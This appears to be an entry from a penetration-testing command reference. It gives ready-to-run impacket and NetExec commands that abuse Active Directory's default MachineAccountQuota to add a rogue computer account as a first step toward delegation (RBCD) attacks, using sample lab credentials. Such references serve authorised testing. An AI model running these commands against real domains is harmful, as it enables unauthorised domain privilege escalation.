---
description: |
  Add a computer account to the domain. Default MachineAccountQuota
  allows any user to add up to 10 computers. Useful for RBCD attacks.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Add computer account
  impacket-addcomputer test.local/pentuser:P@ssw0rd123 -computer-name 'FAKE$' -computer-pass 'FakeP@ss123' -dc-ip 10.10.10.1

  # Verify
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --users | grep FAKE
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
techniques:
  - Delegation_Abuse
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
